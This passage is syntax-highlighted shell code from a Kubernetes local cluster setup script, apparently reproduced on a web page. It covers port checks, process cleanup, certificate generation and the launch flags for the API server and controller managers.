class="meta">#</span><span class="bash"> name of the cgroup driver, i.e. cgroupfs or systemd</span></span><br><span class="line">if [[ $&#123;CONTAINER_RUNTIME&#125; == "docker" ]]; then</span><br><span class="line"><span class="meta">  #</span><span class="bash"> default cgroup driver to match what is reported by docker to simplify <span class="built_in">local</span> development</span></span><br><span class="line">  if [[ -z $&#123;CGROUP_DRIVER&#125; ]]; then</span><br><span class="line">    # match driver with docker runtime reported value (they must match)</span><br><span class="line">    CGROUP_DRIVER=$(docker info | grep "Cgroup Driver:" | cut -f3- -d' ')</span><br><span class="line">    echo "Kubelet cgroup driver defaulted to use: $&#123;CGROUP_DRIVER&#125;"</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Ensure CERT_DIR is created <span class="keyword">for</span> auto-generated crt/key and kubeconfig</span></span><br><span class="line">mkdir -p "$&#123;CERT_DIR&#125;" &amp;&gt;/dev/null || sudo mkdir -p "$&#123;CERT_DIR&#125;"</span><br><span class="line">CONTROLPLANE_SUDO=$(test -w "$&#123;CERT_DIR&#125;" || echo "sudo -E")</span><br><span class="line">function test_apiserver_off &#123;</span><br><span class="line">    # For the common local scenario, fail fast if server is already running.</span><br><span class="line">    # this can happen if you run local-up-cluster.sh twice and kill etcd in between.</span><br><span class="line">    if [[ "$&#123;API_PORT&#125;" -gt "0" ]]; then</span><br><span class="line">        curl --silent -g $API_HOST:$API_PORT</span><br><span class="line">        if [ ! $? -eq 0 ]; then</span><br><span class="line">            echo "API SERVER insecure port is free, proceeding..."</span><br><span class="line">        else</span><br><span class="line">            echo "ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_PORT"</span><br><span class="line">            exit 1</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">    curl --silent -k -g $API_HOST:$API_SECURE_PORT</span><br><span class="line">    if [ ! $? -eq 0 ]; then</span><br><span class="line">        echo "API SERVER secure port is free, proceeding..."</span><br><span class="line">    else</span><br><span class="line">        echo "ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_SECURE_PORT"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function detect_binary &#123;</span><br><span class="line">    # Detect the OS name/arch so that we can find our binary</span><br><span class="line">    case "$(uname -s)" in</span><br><span class="line">      Darwin)</span><br><span class="line">        host_os=darwin</span><br><span class="line">        ;;</span><br><span class="line">      Linux)</span><br><span class="line">        host_os=linux</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        echo "Unsupported host OS.  Must be Linux or Mac OS X." &gt;&amp;2</span><br><span class="line">        exit 1</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">    case "$(uname -m)" in</span><br><span class="line">      x86_64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      i?86_64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      amd64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      aarch64*)</span><br><span class="line">        host_arch=arm64</span><br><span class="line">        ;;</span><br><span class="line">      arm64*)</span><br><span class="line">        host_arch=arm64</span><br><span class="line">        ;;</span><br><span class="line">      arm*)</span><br><span class="line">        host_arch=arm</span><br><span class="line">        ;;</span><br><span class="line">      i?86*)</span><br><span class="line">        host_arch=x86</span><br><span class="line">        ;;</span><br><span class="line">      s390x*)</span><br><span class="line">        host_arch=s390x</span><br><span class="line">        ;;</span><br><span class="line">      ppc64le*)</span><br><span class="line">        host_arch=ppc64le</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        echo "Unsupported host arch. Must be x86_64, 386, arm, arm64, s390x or ppc64le." &gt;&amp;2</span><br><span class="line">        exit 1</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">   GO_OUT="$&#123;KUBE_ROOT&#125;/_output/local/bin/$&#123;host_os&#125;/$&#123;host_arch&#125;"</span><br><span class="line">&#125;</span><br><span class="line">cleanup_dockerized_kubelet()</span><br><span class="line">&#123;</span><br><span class="line">  if [[ -e $KUBELET_CIDFILE ]]; then</span><br><span class="line">    docker kill $(&lt;$KUBELET_CIDFILE) &gt; /dev/null</span><br><span class="line">    rm -f $KUBELET_CIDFILE</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line">cleanup()</span><br><span class="line">&#123;</span><br><span class="line">  echo "Cleaning up..."</span><br><span class="line"><span class="meta">  #</span><span class="bash"> delete running images</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;ENABLE_CLUSTER_DNS&#125;</span>"</span> == <span class="literal">true</span> ]]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Still need to figure why this commands throw an error: Error from server: client: etcd cluster is unavailable or misconfigured</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">     <span class="variable">$&#123;KUBECTL&#125;</span> --namespace=kube-system delete service kube-dns</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> And this one hang forever:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">     <span class="variable">$&#123;KUBECTL&#125;</span> --namespace=kube-system delete rc kube-dns-v10</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">fi</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the API server is still running</span></span><br><span class="line">  [[ -n "$&#123;APISERVER_PID-&#125;" ]] &amp;&amp; APISERVER_PIDS=$(pgrep -P $&#123;APISERVER_PID&#125; ; ps -o pid= -p $&#123;APISERVER_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;APISERVER_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;APISERVER_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the controller-manager is still running</span></span><br><span class="line">  [[ -n "$&#123;CTLRMGR_PID-&#125;" ]] &amp;&amp; CTLRMGR_PIDS=$(pgrep -P $&#123;CTLRMGR_PID&#125; ; ps -o pid= -p $&#123;CTLRMGR_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;CTLRMGR_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;CTLRMGR_PIDS&#125;</span><br><span class="line">  if [[ -n "$DOCKERIZE_KUBELET" ]]; then</span><br><span class="line">    cleanup_dockerized_kubelet</span><br><span class="line">  else</span><br><span class="line">    # Check if the kubelet is still running</span><br><span class="line">    [[ -n "$&#123;KUBELET_PID-&#125;" ]] &amp;&amp; KUBELET_PIDS=$(pgrep -P $&#123;KUBELET_PID&#125; ; ps -o pid= -p $&#123;KUBELET_PID&#125;)</span><br><span class="line">    [[ -n "$&#123;KUBELET_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;KUBELET_PIDS&#125;</span><br><span class="line">  fi</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the proxy is still running</span></span><br><span class="line">  [[ -n "$&#123;PROXY_PID-&#125;" ]] &amp;&amp; PROXY_PIDS=$(pgrep -P $&#123;PROXY_PID&#125; ; ps -o pid= -p $&#123;PROXY_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;PROXY_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;PROXY_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the scheduler is still running</span></span><br><span class="line">  [[ -n "$&#123;SCHEDULER_PID-&#125;" ]] &amp;&amp; SCHEDULER_PIDS=$(pgrep -P $&#123;SCHEDULER_PID&#125; ; ps -o pid= -p $&#123;SCHEDULER_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;SCHEDULER_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;SCHEDULER_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the etcd is still running</span></span><br><span class="line">  [[ -n "$&#123;ETCD_PID-&#125;" ]] &amp;&amp; kube::etcd::stop</span><br><span class="line">  [[ -n "$&#123;ETCD_DIR-&#125;" ]] &amp;&amp; kube::etcd::clean_etcd_dir</span><br><span class="line">  exit 0</span><br><span class="line">&#125;</span><br><span class="line">function warning &#123;</span><br><span class="line">  message=$1</span><br><span class="line">  echo $(tput bold)$(tput setaf 1)</span><br><span class="line">  echo "WARNING: $&#123;message&#125;"</span><br><span class="line">  echo $(tput sgr0)</span><br><span class="line">&#125;</span><br><span class="line">function start_etcd &#123;</span><br><span class="line">    echo "Starting etcd"</span><br><span class="line">    kube::etcd::start</span><br><span class="line">&#125;</span><br><span class="line">function set_service_accounts &#123;</span><br><span class="line">    SERVICE_ACCOUNT_LOOKUP=$&#123;SERVICE_ACCOUNT_LOOKUP:-true&#125;</span><br><span class="line">    SERVICE_ACCOUNT_KEY=$&#123;SERVICE_ACCOUNT_KEY:-/tmp/kube-serviceaccount.key&#125;</span><br><span class="line">    # Generate ServiceAccount key if needed</span><br><span class="line">    if [[ ! -f "$&#123;SERVICE_ACCOUNT_KEY&#125;" ]]; then</span><br><span class="line">      mkdir -p "$(dirname $&#123;SERVICE_ACCOUNT_KEY&#125;)"</span><br><span class="line">      openssl genrsa -out "$&#123;SERVICE_ACCOUNT_KEY&#125;" 2048 2&gt;/dev/null</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_apiserver &#123;</span><br><span class="line">    security_admission=""</span><br><span class="line">    if [[ -n "$&#123;DENY_SECURITY_CONTEXT_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",SecurityContextDeny"</span><br><span class="line">    fi</span><br><span class="line">    if [[ -n "$&#123;PSP_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",PodSecurityPolicy"</span><br><span class="line">    fi</span><br><span class="line">    if [[ -n "$&#123;NODE_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",NodeRestriction"</span><br><span class="line">    fi</span><br><span class="line">    if [ "$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;" == true ]; then</span><br><span class="line">      security_admission=",Priority"</span><br><span class="line">      if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">          RUNTIME_CONFIG+=","</span><br><span class="line">      fi</span><br><span class="line">      RUNTIME_CONFIG+="scheduling.k8s.io/v1alpha1=true"</span><br><span class="line">    fi</span><br><span class="line">    # Admission Controllers to invoke prior to persisting objects in cluster</span><br><span class="line">    #</span><br><span class="line">    # The order defined here dose not matter.</span><br><span class="line">    ENABLE_ADMISSION_PLUGINS=LimitRanger,ServiceAccount$&#123;security_admission&#125;,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection</span><br><span class="line">    audit_arg=""</span><br><span class="line">    APISERVER_BASIC_AUDIT_LOG=""</span><br><span class="line">    if [[ "$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;" = true ]]; then</span><br><span class="line">        # We currently only support enabling with a fixed path and with built-in log</span><br><span class="line">        # rotation "disabled" (large value) so it behaves like kube-apiserver.log.</span><br><span class="line">        # External log rotation should be set up the same as for kube-apiserver.log.</span><br><span class="line">        APISERVER_BASIC_AUDIT_LOG=/tmp/kube-apiserver-audit.log</span><br><span class="line">        audit_arg=" --audit-log-path=$&#123;APISERVER_BASIC_AUDIT_LOG&#125;"</span><br><span class="line">        audit_arg+=" --audit-log-maxage=0"</span><br><span class="line">        audit_arg+=" --audit-log-maxbackup=0"</span><br><span class="line">        # Lumberjack doesn't offer any way to disable size-based rotation. It also</span><br><span class="line">        # has an in-memory counter that doesn't notice if you truncate the file.</span><br><span class="line">        # 2000000000 (in MiB) is a large number that fits in 31 bits. If the log</span><br><span class="line">        # grows at 10MiB/s (~30K QPS), it will rotate after ~6 years if apiserver</span><br><span class="line">        # never restarts. Please manually restart apiserver before this time.</span><br><span class="line">        audit_arg+=" --audit-log-maxsize=2000000000"</span><br><span class="line">    fi</span><br><span class="line">    swagger_arg=""</span><br><span class="line">    if [[ "$&#123;ENABLE_SWAGGER_UI&#125;" = true ]]; then</span><br><span class="line">      swagger_arg="--enable-swagger-ui=true "</span><br><span class="line">    fi</span><br><span class="line">    authorizer_arg=""</span><br><span class="line">    if [[ -n "$&#123;AUTHORIZATION_MODE&#125;" ]]; then</span><br><span class="line">      authorizer_arg="--authorization-mode=$&#123;AUTHORIZATION_MODE&#125; "</span><br><span class="line">    fi</span><br><span class="line">    priv_arg=""</span><br><span class="line">    if [[ -n "$&#123;ALLOW_PRIVILEGED&#125;" ]]; then</span><br><span class="line">      priv_arg="--allow-privileged "</span><br><span class="line">    fi</span><br><span class="line">    if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *"Initializers"* ]]; then</span><br><span class="line">        if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">          RUNTIME_CONFIG+=","</span><br><span class="line">        fi</span><br><span class="line">        RUNTIME_CONFIG+="admissionregistration.k8s.io/v1alpha1"</span><br><span class="line">    fi</span><br><span class="line">    if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *"PodPreset"* ]]; then</span><br><span class="line">        if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">            RUNTIME_CONFIG+=","</span><br><span class="line">        fi</span><br><span class="line">        RUNTIME_CONFIG+="settings.k8s.io/v1alpha1"</span><br><span class="line">    fi</span><br><span class="line">    runtime_config=""</span><br><span class="line">    if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">      runtime_config="--runtime-config=$&#123;RUNTIME_CONFIG&#125;"</span><br><span class="line">    fi</span><br><span class="line">    # Let the API server pick a default address when API_HOST_IP</span><br><span class="line">    # is set to 127.0.0.1</span><br><span class="line">    advertise_address=""</span><br><span class="line">    if [[ "$&#123;API_HOST_IP&#125;" != "127.0.0.1" ]]; then</span><br><span class="line">        advertise_address="--advertise-address=$&#123;API_HOST_IP&#125;"</span><br><span class="line">    fi</span><br><span class="line">    if [[ "$&#123;ADVERTISE_ADDRESS&#125;" != "" ]] ; then</span><br><span class="line">        advertise_address="--advertise-address=$&#123;ADVERTISE_ADDRESS&#125;"</span><br><span class="line">    fi</span><br><span class="line">    # Create CA signers</span><br><span class="line">    if [[ "$&#123;ENABLE_SINGLE_CA_SIGNER:-&#125;" = true ]]; then</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" server '"client auth","server auth"'</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca.key" "$&#123;CERT_DIR&#125;/client-ca.key"</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca.crt" "$&#123;CERT_DIR&#125;/client-ca.crt"</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca-config.json" "$&#123;CERT_DIR&#125;/client-ca-config.json"</span><br><span class="line">    else</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" server '"server auth"'</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" client '"client auth"'</span><br><span class="line">    fi</span><br><span class="line">    # Create auth proxy client ca</span><br><span class="line">    kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" request-header '"client auth"'</span><br><span class="line">    # serving cert for kube-apiserver</span><br><span class="line">    kube::util::create_serving_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "server-ca" kube-apiserver kubernetes.default kubernetes.default.svc "localhost" $&#123;API_HOST_IP&#125; $&#123;API_HOST&#125; $&#123;FIRST_SERVICE_CLUSTER_IP&#125;</span><br><span class="line">    # Create client certs signed with client-ca, given id, given CN and a number of groups</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kubelet system:node:$&#123;HOSTNAME_OVERRIDE&#125; system:nodes</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kube-proxy system:kube-proxy system:nodes</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' controller system:kube-controller-manager</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' scheduler  system:kube-scheduler</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' admin system:admin system:masters</span><br><span class="line">    # Create matching certificates for kube-aggregator</span><br><span class="line">    kube::util::create_serving_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "server-ca" kube-aggregator api.kube-public.svc "localhost" $&#123;API_HOST_IP&#125;</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" request-header-ca auth-proxy system:auth-proxy</span><br><span class="line">    # TODO remove masters and add rolebinding</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kube-aggregator system:kube-aggregator system:masters</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kube-aggregator</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">      cloud_config_arg="--cloud-provider=external"</span><br><span class="line">    fi</span><br><span class="line">    APISERVER_LOG=$&#123;LOG_DIR&#125;/kube-apiserver.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" apiserver $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-apiserver" $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \</span><br><span class="line">      $&#123;cloud_config_arg&#125; \</span><br><span class="line">      $&#123;advertise_address&#125; \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      --cert-dir="$&#123;CERT_DIR&#125;" \</span><br><span class="line">      --client-ca-file="$&#123;CERT_DIR&#125;/client-ca.crt" \</span><br><span class="line">      --service-account-key-file="$&#123;SERVICE_ACCOUNT_KEY&#125;" \</span><br><span class="line">      --service-account-lookup="$&#123;SERVICE_ACCOUNT_LOOKUP&#125;" \</span><br><span class="line">      --enable-admission-plugins="$&#123;ENABLE_ADMISSION_PLUGINS&#125;" \</span><br><span class="line">      --disable-admission-plugins="$&#123;DISABLE_ADMISSION_PLUGINS&#125;" \</span><br><span class="line">      --admission-control-config-file="$&#123;ADMISSION_CONTROL_CONFIG_FILE&#125;" \</span><br><span class="line">      --bind-address="$&#123;API_BIND_ADDR&#125;" \</span><br><span class="line">      --secure-port="$&#123;API_SECURE_PORT&#125;" \</span><br><span class="line">      --tls-cert-file="$&#123;CERT_DIR&#125;/serving-kube-apiserver.crt" \</span><br><span class="line">      --tls-private-key-file="$&#123;CERT_DIR&#125;/serving-kube-apiserver.key" \</span><br><span class="line">      --insecure-bind-address="$&#123;API_HOST_IP&#125;" \</span><br><span class="line">      --insecure-port="$&#123;API_PORT&#125;" \</span><br><span class="line">      --storage-backend=$&#123;STORAGE_BACKEND&#125; \</span><br><span class="line">      --etcd-servers="http://$&#123;ETCD_HOST&#125;:$&#123;ETCD_PORT&#125;" \</span><br><span class="line">      --service-cluster-ip-range="$&#123;SERVICE_CLUSTER_IP_RANGE&#125;" \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --external-hostname="$&#123;EXTERNAL_HOSTNAME&#125;" \</span><br><span class="line">      --requestheader-username-headers=X-Remote-User \</span><br><span class="line">      --requestheader-group-headers=X-Remote-Group \</span><br><span class="line">      --requestheader-extra-headers-prefix=X-Remote-Extra- \</span><br><span class="line">      --requestheader-client-ca-file="$&#123;CERT_DIR&#125;/request-header-ca.crt" \</span><br><span class="line">      --requestheader-allowed-names=system:auth-proxy \</span><br><span class="line">      --proxy-client-cert-file="$&#123;CERT_DIR&#125;/client-auth-proxy.crt" \</span><br><span class="line">      --proxy-client-key-file="$&#123;CERT_DIR&#125;/client-auth-proxy.key" \</span><br><span class="line">      --cors-allowed-origins="$&#123;API_CORS_ALLOWED_ORIGINS&#125;" &gt;"$&#123;APISERVER_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    APISERVER_PID=$!</span><br><span class="line">    # Wait for kube-apiserver to come up before launching the rest of the components.</span><br><span class="line">    echo "Waiting for apiserver to come up"</span><br><span class="line">    # this uses the API port because if you don't have any authenticator, you can't seem to use the secure port at all.</span><br><span class="line">    # this matches what happened with the combination in 1.4.</span><br><span class="line">    # TODO change this conditionally based on whether API_PORT is on or off</span><br><span class="line">    kube::util::wait_for_url "https://$&#123;API_HOST_IP&#125;:$&#123;API_SECURE_PORT&#125;/healthz" "apiserver: " 1 $&#123;WAIT_FOR_URL_API_SERVER&#125; \</span><br><span class="line">        || &#123; echo "check apiserver logs: $&#123;APISERVER_LOG&#125;" ; exit 1 ; &#125;</span><br><span class="line">    # Create kubeconfigs for all components, using client certs</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" admin</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; chown "$&#123;USER&#125;" "$&#123;CERT_DIR&#125;/client-admin.key" # make readable for kubectl</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kubelet</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kube-proxy</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" controller</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" scheduler</span><br><span class="line">    if [[ -z "$&#123;AUTH_ARGS&#125;" ]]; then</span><br><span class="line">        AUTH_ARGS="--client-key=$&#123;CERT_DIR&#125;/client-admin.key --client-certificate=$&#123;CERT_DIR&#125;/client-admin.crt"</span><br><span class="line">    fi</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; cp "$&#123;CERT_DIR&#125;/admin.kubeconfig" "$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig"</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; chown $(whoami) "$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig"</span><br><span class="line">    $&#123;KUBECTL&#125; config set-cluster local-up-cluster --kubeconfig="$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig" --server="https://$&#123;API_HOST_IP&#125;:31090"</span><br><span class="line">    echo "use 'kubectl --kubeconfig=$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig' to use the aggregated API server"</span><br><span class="line">&#125;</span><br><span class="line">function start_controller_manager &#123;</span><br><span class="line">    node_cidr_args=""</span><br><span class="line">    if [[ "$&#123;NET_PLUGIN&#125;" == "kubenet" ]]; then</span><br><span class="line">      node_cidr_args="--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 "</span><br><span class="line">    fi</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">      cloud_config_arg="--cloud-provider=external"</span><br><span class="line">      cloud_config_arg+=" --external-cloud-volume-plugin=$&#123;CLOUD_PROVIDER&#125;"</span><br><span class="line">      cloud_config_arg+=" --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    fi</span><br><span class="line">    CTLRMGR_LOG=$&#123;LOG_DIR&#125;/kube-controller-manager.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" controller-manager \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-controller-manager" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      --service-account-private-key-file="$&#123;SERVICE_ACCOUNT_KEY&#125;" \</span><br><span class="line">      --root-ca-file="$&#123;ROOT_CA_FILE&#125;" \</span><br><span class="line">      --cluster-signing-cert-file="$&#123;CLUSTER_SIGNING_CERT_FILE&#125;" \</span><br><span class="line">      --cluster-signing-key-file="$&#123;CLUSTER_SIGNING_KEY_FILE&#125;" \</span><br><span class="line">      --enable-hostpath-provisioner="$&#123;ENABLE_HOSTPATH_PROVISIONER&#125;" \</span><br><span class="line">      $&#123;node_cidr_args&#125; \</span><br><span class="line">      --pvclaimbinder-sync-period="$&#123;CLAIM_BINDER_SYNC_PERIOD&#125;" \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      $&#123;cloud_config_arg&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/controller.kubeconfig \</span><br><span class="line">      --use-service-account-credentials \</span><br><span class="line">      --controllers="$&#123;KUBE_CONTROLLERS&#125;" \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;CTLRMGR_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    CTLRMGR_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_cloud_controller_manager &#123;</span><br><span class="line">    if [ -z "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">      echo "CLOUD_CONFIG cannot be empty!"</span><br><span class="line">      exit 1</span><br><span class="line">    fi</span><br><span class="line">    if [ ! -f "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">      echo "Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist"</span><br><span class="line">      exit 1</span><br><span class="line">    fi</span><br><span class="line">    node_cidr_args=""</span><br><span class="line">    if [[ "$&#123;NET_PLUGIN&#125;" == "kubenet" ]]; then</span><br><span class="line">      node_cidr_args="--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 "</span><br><span class="line">    fi</span><br><span class="line">    CLOUD_CTLRMGR_LOG=$&#123;LOG_DIR&#125;/cloud-controller-manager.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-"$&#123;GO_OUT&#125;/hyperkube" cloud-controller-manager&#125; \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-"$&#123;GO_OUT&#125;/cloud-controller-manager"&#125; \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      $&#123;node_cidr_args&#125; \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --cloud-provider=$&#123;CLOUD_PROVIDER&#125; \</span><br><span class="line">      --cloud-config=$&#123;CLOUD_CONFIG&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/controller.kubeconfig \</span><br><span class="line">      --use-service-account-credentials \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;CLOUD_CTLRMGR_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    CLOUD_CTLRMGR_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_kubelet &#123;</span><br><span class="line">    KUBELET_LOG=$&#123;LOG_DIR&#125;/kubelet.log</span><br><span class="line">    mkdir -p "$&#123;POD_MANIFEST_PATH&#125;" &amp;&gt;/dev/null || sudo 